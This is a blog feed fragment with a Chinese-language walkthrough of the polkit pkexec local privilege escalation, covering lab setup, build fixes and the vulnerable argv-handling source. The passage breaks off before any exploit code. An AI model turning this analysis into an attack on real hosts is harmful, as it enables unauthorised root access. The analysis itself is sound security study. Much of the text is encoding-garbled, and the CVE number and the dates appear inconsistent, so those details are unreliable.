denied</span><br><span class=\"line\">âœ  squrootfs grep -r &quot;User-Agent: &quot; .              </span><br><span class=\"line\">Binary file ./bin/updatedd matches</span><br><span class=\"line\">Binary file ./bin/busybox matches</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "IoT"
            ]
        },
        {
            "id": "https://squirre17.github.io/2021/08/11/CVE-2021-4030-polkit-pkexec-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/",
            "url": "https://squirre17.github.io/2021/08/11/CVE-2021-4030-polkit-pkexec-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/",
            "title": "CVE-2021-4030 polkit-pkexec æœ¬åœ°ææƒåˆ†æ",
            "date_published": "2021-08-10T16:00:00.000Z",
            "content_html": "<h2 id=\"å‚è€ƒ\"><a class=\"markdownIt-Anchor\" href=\"#å‚è€ƒ\">#</a> å‚è€ƒ</h2>\n<ul>\n<li><a href=\"https://bbs.pediy.com/thread-271423.htm\">çœ‹é›ªå¤§çˆ¹</a></li>\n<li><a href=\"https://trganda.github.io/posts/iconv/\">GCONV_PATH åˆ©ç”¨</a></li>\n<li><a href=\"https://blog.csdn.net/qq_42303523/article/details/117911859#:~:text=linux%E7%B3%BB%E7%BB%9F%E6%8F%90,%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B%E4%BC%9A%E5%A6%82%E4%B8%8B%EF%BC%9A\">GCONV_PATH åˆ©ç”¨ 2</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/470224218?utm_source=qq&amp;utm_medium=social&amp;utm_oi=949109417673797632\">åˆå¤©</a></li>\n<li><a href=\"https://mp.weixin.qq.com/s?__biz=Mzg2MTY0MDc1Mw==&amp;mid=2247484520&amp;idx=1&amp;sn=b9fdfa0c5cc802478a541964a0d5b2c2&amp;chksm=ce154536f962cc20db00097e2b0f4cc155aefb25e54dbc31af29733be6ecf9ba21d3fd77b908&amp;mpshare=1&amp;scene=23&amp;srcid=0301ZZXX7YvmTLBFW02HGXd5&amp;sharer_sharetime=1646130648823&amp;sharer_shareid=35c6bdd49b9ea011edbc171a217d1072#rd\">å¤©ç„å®éªŒå®¤</a></li>\n<li><a href=\"https://www.anquanke.com/post/id/267774#h3-2\">å®‰å…¨å®¢</a></li>\n<li><a href=\"https://www.wt37.cn/5949.html\">å°‘ç¾½</a></li>\n</ul>\n<h2 id=\"è½¯ä»¶ç®€ä»‹\"><a class=\"markdownIt-Anchor\" href=\"#è½¯ä»¶ç®€ä»‹\">#</a> è½¯ä»¶ç®€ä»‹</h2>\n<p><a href=\"https://gitlab.freedesktop.org/polkit/polkit/\">https://gitlab.freedesktop.org/polkit/polkit/</a></p>\n<blockquote>\n<p>polkit is a toolkit for defining and handling authorizations. It is used for allowing unprivileged processes to speak to privileged processes.</p>\n</blockquote>\n<p>pkexec æ˜¯ polkit æ˜¯ä¸€ä¸ªç¨‹åºï¼Œpolkit è´Ÿè´£ä¸åŒç‰¹æƒçº§çš„è¿›ç¨‹é—´çš„é€šè®¯<br>\n <code>pkexec echo &quot;1&quot;</code></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">squ@squ-virtual-machine:~/tools/modules-5.0.1$ pkexec --help</span><br><span class=\"line\">pkexec --version |</span><br><span class=\"line\">       --help |</span><br><span class=\"line\">       --disable-internal-agent |</span><br><span class=\"line\">       [--user username] PROGRAM [ARGUMENTS...]</span><br><span class=\"line\"></span><br><span class=\"line\">See the pkexec manual page for more details.</span><br></pre></td></tr></table></figure>\n<h2 id=\"ç¯å¢ƒ\"><a class=\"markdownIt-Anchor\" href=\"#ç¯å¢ƒ\">#</a> ç¯å¢ƒ</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">squ@squ-virtual-machine:~/tools/modules-5.0.1$ pkexec --version</span><br><span class=\"line\">pkexec version 0.105</span><br><span class=\"line\">squ@squ-virtual-machine:~/tools/modules-5.0.1$ uname -a</span><br><span class=\"line\">Linux squ-virtual-machine 5.11.0-46-generic #51~20.04.1-Ubuntu SMP Fri Jan 7 06:51:40 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>\n<p>dockerï¼š<br>\npull ä¸ª debian ä¸‹æ¥ï¼Œç„¶åè®¾ç½®å…±äº«å·</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -it --name=de -v /home/squ/docker_volumn:/home/vol debian /bin/bash</span><br></pre></td></tr></table></figure>\n<h2 id=\"ä¸‹è½½æºç \"><a class=\"markdownIt-Anchor\" href=\"#ä¸‹è½½æºç \">#</a> ä¸‹è½½æºç </h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">squ@squ-virtual-machine:~/Desktop/cve/policykit-1-0.105$ dpkg -S /usr/bin/pkexec</span><br><span class=\"line\">policykit-1: /usr/bin/pkexec</span><br></pre></td></tr></table></figure>\n<p><code>dpkg</code>  æŸ¥çœ‹åŒ…ä¸º <code>policykit-1</code> <br>\n <code>sudo apt source policykit-1</code>  æˆ–è€…<br>\n<a href=\"https://launchpad.net/ubuntu/bionic/+package/policykit-1\"> https://launchpad.net/ubuntu/bionic/+package/policykit-1</a><br>\n å½±å“ç‰ˆæœ¬ <code>0~0.105</code></p>\n<p>ä¸‹è½½åè·¯å¾„åœ¨ <code>/home/squ/Desktop/cve/policykit-1-0.105/src/programs/pkexec.c</code></p>\n<h2 id=\"ç¯å¢ƒæ­å»º\"><a class=\"markdownIt-Anchor\" href=\"#ç¯å¢ƒæ­å»º\">#</a> ç¯å¢ƒæ­å»º</h2>\n<p>æºç åœ°å€<br>\n<a href=\"https://gitlab.freedesktop.org/polkit/polkit\"> https://gitlab.freedesktop.org/polkit/polkit</a><br>\n åŸºæœ¬æ‰¾ä¸ªè™šæ‹Ÿæœºå°±èƒ½æ‰“ï¼ŒçœŸæ˜¯å¤ª coooooooooooooooooooooooooooool äº†<br>\n docker<br>\n å¦‚æœé‡åˆ°äº† <code>hash mismatch</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">E: Failed to fetch http:<span class=\"comment\">//deb.debian.org/debian/pool/main/b/binutils/binutils-common_2.35.2-2_amd64.deb  Hash Sum mismatch</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get clean  </span><br><span class=\"line\">apt-get update --fix-missing </span><br></pre></td></tr></table></figure>\n<p>å¦‚æœè¿˜æ˜¯ä¸è¡Œå°±æ¢æº <code>/etc/apt/sources.list</code> (debian)<br>\n å†ä¸è¡Œå°±å…³ä»£ç†å§ï¼ˆå…³äº†å°±å¥½äº†</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deb http:<span class=\"comment\">//mirrors.ustc.edu.cn/debian stable main contrib non-free</span></span><br><span class=\"line\"><span class=\"meta\"># deb-src http:<span class=\"comment\">//mirrors.ustc.edu.cn/debian stable main contrib non-free</span></span></span><br><span class=\"line\">deb http:<span class=\"comment\">//mirrors.ustc.edu.cn/debian stable-updates main contrib non-free</span></span><br><span class=\"line\"><span class=\"meta\"># deb-src http:<span class=\"comment\">//mirrors.ustc.edu.cn/debian stable-updates main contrib non-free</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\"># deb http:<span class=\"comment\">//mirrors.ustc.edu.cn/debian stable-proposed-updates main contrib non-free</span></span></span><br><span class=\"line\"><span class=\"meta\"># deb-src http:<span class=\"comment\">//mirrors.ustc.edu.cn/debian stable-proposed-updates main contrib non-free</span></span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>é‡Œé¢æœ‰ä¸€ä¸ª <code>INSTALL</code>  çš„æ–‡ä»¶</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install libc6-dev</span><br><span class=\"line\">apt install gobjc++</span><br><span class=\"line\">./configure CC=c99 CFLAGS=-g LIBS=-lposix</span><br></pre></td></tr></table></figure>\n<p>é‡åˆ°é—®é¢˜</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">checking whether the C compiler works... no</span><br><span class=\"line\">configure: error: in `/home/vol/policykit<span class=\"number\">-1</span><span class=\"number\">-0.105&#x27;</span>:</span><br><span class=\"line\">configure: error: C compiler cannot create executables</span><br></pre></td></tr></table></figure>\n<p>çœ‹ <code>config.log</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">configure:<span class=\"number\">3355</span>: $? = <span class=\"number\">1</span></span><br><span class=\"line\">configure:<span class=\"number\">3375</span>: checking whether the C compiler works</span><br><span class=\"line\">configure:<span class=\"number\">3397</span>: /usr/bin/gcc -g   conftest.c -lposix &gt;&amp;<span class=\"number\">5</span></span><br><span class=\"line\">/usr/bin/ld: cannot find -lposix</span><br><span class=\"line\">collect2: error: ld returned <span class=\"number\">1</span> <span class=\"built_in\">exit</span> status</span><br></pre></td></tr></table></figure>\n<p>å®‰è£…åº“</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install manpages-posix-dev\t</span><br></pre></td></tr></table></figure>\n<p>ä¹Ÿæ²¡ç”¨ï¼Œç´¢æ€§ä¸åŠ  <code>posix</code>  è¯•è¯•çœ‹</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./configure CC=c99 CFLAGS=-g <span class=\"comment\">//LIBS=-lposix</span></span><br></pre></td></tr></table></figure>\n<p>ç»§ç»­æŠ¥é”™</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">configure: error: The pkg-config script could not be found or is too old.  Make sure it</span><br><span class=\"line\">is in your PATH or <span class=\"built_in\">set</span> the PKG_CONFIG environment variable to the full</span><br><span class=\"line\">path to pkg-config.</span><br></pre></td></tr></table></figure>\n<p>å®‰è£…</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install -y pkg-config</span><br></pre></td></tr></table></figure>\n<p>ç»§ç»­æŠ¥é”™</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">configure: error: Package requirements (gio-2.0 &gt;= 2.28.0) were not met:</span><br><span class=\"line\"></span><br><span class=\"line\">No package &#x27;gio-2.0&#x27; found</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install -y gio-2.0</span><br></pre></td></tr></table></figure>\n<p>ç„¶ååˆæ¥</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/bin/ld: cannot find -lpam</span><br></pre></td></tr></table></figure>\n<p>è¿™æ˜¯å› ä¸ºç¼ºå°‘ <code>libpam.so</code>  çš„åº“ï¼Œåœ¨ debian ç³»ç»Ÿä¸Šï¼Œå¯ä»¥è¿™æ ·ä¸‹è½½  <code>lib + id-dev</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install -y libpam-dev</span><br></pre></td></tr></table></figure>\n<p>ç»§ç»­æŠ¥é”™</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">checking <span class=\"keyword\">for</span> intltool &gt;= <span class=\"number\">0.40</span><span class=\"number\">.0</span>...  found</span><br><span class=\"line\">configure: error: Your intltool is too old.  You need intltool <span class=\"number\">0.40</span><span class=\"number\">.0</span> or later.</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install intltool</span><br></pre></td></tr></table></figure>\n<p>configure æ²¡é—®é¢˜äº† make æ¥äº†</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">polkitagentsession.c:<span class=\"number\">58</span>:<span class=\"number\">10</span>: fatal error: gio/gunixoutputstream.h: No such file or directory</span><br><span class=\"line\">   <span class=\"number\">58</span> | <span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;gio/gunixoutputstream.h&gt;</span></span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install libglib2.0</span><br><span class=\"line\">apt-get install libgio2.0</span><br></pre></td></tr></table></figure>\n<p>è¿˜æ˜¯æ²¡ç”¨<br>\nå‘ç° <code>gio-unix-2.0*</code>  ä¸‹é¢å°±æ˜¯ <code>gio</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cp</span> -r /usr/include/gio-unix-2.0/gio/ /usr/include/</span><br></pre></td></tr></table></figure>\n<h2 id=\"åŸç†åˆ†æ\"><a class=\"markdownIt-Anchor\" href=\"#åŸç†åˆ†æ\">#</a> åŸç†åˆ†æ</h2>\n<h3 id=\"æ•°ç»„è¶Šç•Œ\"><a class=\"markdownIt-Anchor\" href=\"#æ•°ç»„è¶Šç•Œ\">#</a> æ•°ç»„è¶Šç•Œ</h3>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span> <span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> *argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  Â·Â·Â·Â·Â·Â·Â·</span><br><span class=\"line\">  <span class=\"type\">const</span> gchar *environment_variables_to_save[] = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;SHELL&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LANG&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LINGUAS&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LANGUAGE&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LC_COLLATE&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LC_CTYPE&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LC_MESSAGES&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LC_MONETARY&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LC_NUMERIC&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LC_TIME&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LC_ALL&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;TERM&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;COLORTERM&quot;</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* By default we don&#x27;t allow running X11 apps, as it does not work in the</span></span><br><span class=\"line\"><span class=\"comment\">     * general case. See</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     *  https://bugs.freedesktop.org/show_bug.cgi?id=17970#c26</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * and surrounding comments for a lot of discussion about this.</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * However, it can be enabled for some selected and tested legacy programs</span></span><br><span class=\"line\"><span class=\"comment\">     * which previously used e. g. gksu, by setting the</span></span><br><span class=\"line\"><span class=\"comment\">     * org.freedesktop.policykit.exec.allow_gui annotation to a nonempty value.</span></span><br><span class=\"line\"><span class=\"comment\">     * See https://bugs.freedesktop.org/show_bug.cgi?id=38769 for details.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"string\">&quot;DISPLAY&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;XAUTHORITY&quot;</span>,</span><br><span class=\"line\">    <span class=\"literal\">NULL</span></span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  GPtrArray *saved_env;</span><br><span class=\"line\">  gchar *opt_user;</span><br><span class=\"line\">  <span class=\"type\">pid_t</span> pid_of_caller;</span><br><span class=\"line\">  gpointer local_agent_handle;</span><br><span class=\"line\"></span><br><span class=\"line\">  ret = <span class=\"number\">127</span>;</span><br><span class=\"line\">  authority = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  subject = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  details = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  result = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  action_id = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  saved_env = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  path = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  command_line = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  opt_user = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  local_agent_handle = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* check for correct invocation */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"built_in\">geteuid</span> () != <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;pkexec must be setuid root\\n&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  original_user_name = <span class=\"built_in\">g_strdup</span> (<span class=\"built_in\">g_get_user_name</span> ());</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (original_user_name == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;Error getting user name.\\n&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((original_cwd = <span class=\"built_in\">g_get_current_dir</span> ()) == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;Error getting cwd: %s\\n&quot;</span>,</span><br><span class=\"line\">                  <span class=\"built_in\">g_strerror</span> (errno));</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* First process options and find the command-line to invoke. Avoid using fancy library routines</span></span><br><span class=\"line\"><span class=\"comment\">   * that depend on environtment variables since we haven&#x27;t cleared the environment just yet.</span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\">  opt_show_help = FALSE;</span><br><span class=\"line\">  opt_show_version = FALSE;</span><br><span class=\"line\">  opt_disable_internal_agent = FALSE;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (n = <span class=\"number\">1</span>; n &lt; (guint) argc; n++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"built_in\">strcmp</span> (argv[n], <span class=\"string\">&quot;--help&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          opt_show_help = TRUE;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"built_in\">strcmp</span> (argv[n], <span class=\"string\">&quot;--version&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          opt_show_version = TRUE;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"built_in\">strcmp</span> (argv[n], <span class=\"string\">&quot;--user&quot;</span>) == <span class=\"number\">0</span> || <span class=\"built_in\">strcmp</span> (argv[n], <span class=\"string\">&quot;-u&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          n++;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (n &gt;= (guint) argc)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              <span class=\"built_in\">usage</span> (argc, argv);</span><br><span class=\"line\">              <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"keyword\">if</span> (opt_user != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;--user specified twice\\n&quot;</span>);</span><br><span class=\"line\">              <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">          opt_user = <span class=\"built_in\">g_strdup</span> (argv[n]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"built_in\">strcmp</span> (argv[n], <span class=\"string\">&quot;--disable-internal-agent&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          opt_disable_internal_agent = TRUE;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>90 è¡Œ n æ˜¯ä» 1 å¼€å§‹çš„<br>\n 120 è¡Œ break æ˜¯é€€å‡ºå¾ªç¯ï¼Œè¯´æ˜æ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤<br>\nåé¢éƒ¨åˆ†</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">g_assert</span> (argv[argc] == <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">path = <span class=\"built_in\">g_strdup</span> (argv[n]);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (path == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">usage</span> (argc, argv);</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (path[<span class=\"number\">0</span>] != <span class=\"string\">&#x27;/&#x27;</span>)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"comment\">/* g_find_program_in_path() is not suspectible to attacks via the environment */</span></span><br><span class=\"line\">    s = <span class=\"built_in\">g_find_program_in_path</span> (path);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (s == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;Cannot run program %s: %s\\n&quot;</span>, path, <span class=\"built_in\">strerror</span> (ENOENT));</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    <span class=\"built_in\">g_free</span> (path);</span><br><span class=\"line\">    path = s;</span><br><span class=\"line\"></span><br><span 